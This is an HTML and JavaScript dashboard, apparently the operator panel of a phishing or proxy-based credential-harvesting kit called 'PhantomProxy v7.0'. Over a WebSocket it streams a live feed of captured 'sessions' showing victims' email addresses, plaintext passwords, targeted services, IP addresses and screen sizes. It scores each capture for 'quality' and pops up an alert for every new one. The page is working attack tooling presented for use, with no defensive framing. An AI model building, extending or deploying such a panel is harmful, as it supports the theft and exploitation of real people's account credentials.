<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PhantomProxy v7.0 - Real-Time Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Arial, sans-serif; 
            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%); 
            color: #eee; 
            min-height: 100vh;
        }
        .header { 
            background: rgba(0, 0, 0, 0.3); 
            padding: 25px 40px; 
            display: flex; 
            justify-content: space-between; 
            align-items: center;
            backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .logo { 
            font-size: 28px; 
            font-weight: bold;
            background: linear-gradient(45deg, #00d2ff, #3a7bd5);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .status { 
            display: flex; 
            align-items: center; 
            gap: 10px;
            background: rgba(0, 255, 136, 0.1);
            padding: 10px 20px;
            border-radius: 25px;
            border: 1px solid rgba(0, 255, 136, 0.3);
        }
        .status-dot {
            width: 10px;
            height: 10px;
            background: #00ff88;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.2); }
        }
        .container { padding: 50px; max-width: 1800px; margin: 0 auto; }
        .stats { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); 
            gap: 30px; 
            margin-bottom: 50px; 
        }
        .stat-card { 
            background: rgba(255,255,255,0.05); 
            padding: 40px; 
            border-radius: 20px; 
            text-align: center;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
            transition: all 0.3s;
        }
        .stat-card:hover { 
            transform: translateY(-10px);
            border-color: #00d2ff;
            box-shadow: 0 20px 40px rgba(0, 210, 255, 0.2);
        }
        .stat-value { 
            font-size: 64px; 
            font-weight: bold; 
            background: linear-gradient(45deg, #00d2ff, #3a7bd5);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .stat-label { color: #aaa; margin-top: 15px; font-size: 16px; }
        .live-feed {
            background: rgba(255,255,255,0.05);
            border-radius: 20px;
            padding: 30px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255,255,255,0.1);
        }
        .live-feed h2 {
            color: #00d2ff;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .feed-item {
            background: rgba(0, 210, 255, 0.05);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 15px;
            border-left: 4px solid #00d2ff;
            animation: slideIn 0.5s ease;
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateX(-20px); }
            to { opacity: 1; transform: translateX(0); }
        }
        .feed-item.new {
            background: rgba(0, 255, 136, 0.1);
            border-left-color: #00ff88;
        }
        .quality-badge { 
            padding: 6px 14px; 
            border-radius: 20px; 
            font-size: 11px; 
            font-weight: bold;
            display: inline-block;
        }
        .quality-excellent { background: linear-gradient(45deg, #00b09b, #96c93d); }
        .quality-good { background: linear-gradient(45deg, #00d2ff, #3a7bd5); }
        .quality-average { background: linear-gradient(45deg, #f7971e, #ffd200); }
        .quality-low { background: linear-gradient(45deg, #cb2d3e, #ef473a); }
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(0, 255, 136, 0.2);
            backdrop-filter: blur(10px);
            padding: 20px 30px;
            border-radius: 15px;
            border: 1px solid rgba(0, 255, 136, 0.3);
            transform: translateX(400px);
            transition: transform 0.3s ease;
            z-index: 1000;
        }
        .notification.show {
            transform: translateX(0);
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">⚡ PhantomProxy v7.0</div>
        <div class="status">
            <div class="status-dot"></div>
            <span id="connectionStatus">Connecting...</span>
        </div>
    </div>
    
    <div class="container">
        <h1 style="margin-bottom: 40px; font-size: 36px; color: #fff;">🔴 Real-Time Dashboard</h1>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-value" id="totalSessions">0</div>
                <div class="stat-label">Total Sessions</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="todaySessions">0</div>
                <div class="stat-label">Today</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="avgQuality">0</div>
                <div class="stat-label">Avg Quality</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="activeServices">0</div>
                <div class="stat-label">Services</div>
            </div>
        </div>
        
        <div class="live-feed">
            <h2>🔴 Live Session Feed</h2>
            <div id="feedContainer">
                <p style="color: #666; text-align: center;">Waiting for real-time updates...</p>
            </div>
        </div>
    </div>
    
    <div class="notification" id="notification">
        <strong>🎯 New Session!</strong>
        <p id="notificationText"></p>
    </div>
    
    <script>
        let ws;
        let totalSessions = 0;
        
        function connect() {
            const wsUrl = `ws://${window.location.hostname}:8765`;
            console.log('Connecting to', wsUrl);
            
            ws = new WebSocket(wsUrl);
            
            ws.onopen = () => {
                console.log('✅ Connected');
                document.getElementById('connectionStatus').textContent = 'Connected';
                document.getElementById('connectionStatus').style.color = '#00ff88';
            };
            
            ws.onclose = () => {
                console.log('❌ Disconnected. Reconnecting...');
                document.getElementById('connectionStatus').textContent = 'Disconnected';
                document.getElementById('connectionStatus').style.color = '#ff4757';
                setTimeout(connect, 3000);
            };
            
            ws.onerror = (error) => {
                console.error('WebSocket error:', error);
            };
            
            ws.onmessage = (event) => {
                try {
                    const data = JSON.parse(event.data);
                    console.log('📥 Received:', data);
                    
                    if (data.type === 'connected') {
                        totalSessions = data.total_sessions;
                        updateStats({ total: totalSessions, today: 0, services: {} });
                    }
                    else if (data.type === 'new_session') {
                        handleNewSession(data.session, data.quality);
                        totalSessions++;
                        document.getElementById('totalSessions').textContent = totalSessions;
                        showNotification(data.session);
                    }
                    else if (data.type === 'stats_update') {
                        updateStats(data.stats);
                    }
                } catch (e) {
                    console.error('Error processing message:', e);
                }
            };
        }
        
        function handleNewSession(session, quality) {
            const container = document.getElementById('feedContainer');
            
            // Remove "waiting" message
            if (container.querySelector('p')) {
                container.innerHTML = '';
            }
            
            const item = document.createElement('div');
            item.className = 'feed-item new';
            item.innerHTML = `
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                    <strong style="color: #00ff88;">🎯 New Session</strong>
                    <span class="quality-badge quality-${quality.classification.toLowerCase()}">${quality.classification} (${quality.score}/100)</span>
                </div>
                <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; font-size: 14px;">
                    <div>📧 <strong>Email:</strong><br>${session.email || 'N/A'}</div>
                    <div>🔑 <strong>Password:</strong><br>${session.password || 'N/A'}</div>
                    <div>🏢 <strong>Service:</strong><br>${session.service || 'N/A'}</div>
                    <div>🌐 <strong>IP:</strong><br>${session.ip || 'N/A'}</div>
                    <div>🖥️ <strong>Screen:</strong><br>${session.screen_resolution || 'N/A'}</div>
                    <div>⏰ <strong>Time:</strong><br>${new Date(session.created_at).toLocaleString()}</div>
                </div>
            `;
            
            container.insertBefore(item, container.firstChild);
            
            // Keep only last 20 items
            while (container.children.length > 20) {
                container.removeChild(container.lastChild);
            }
        }
        
        function updateStats(stats) {
            document.getElementById('totalSessions').textContent = stats.total || 0;
            document.getElementById('todaySessions').textContent = stats.today || 0;
            document.getElementById('activeServices').textContent = Object.keys(stats.services || {}).length;
        }
        
        function showNotification(session) {
            const notification = document.getElementById('notification');
            const text = document.getElementById('notificationText');
            
            text.textContent = `${session.email} - ${session.service}`;
            notification.classList.add('show');
            
            setTimeout(() => {
                notification.classList.remove('show');
            }, 5000);
        }
        
        // Connect on load
        connect();
    </script>
</body>
</html>
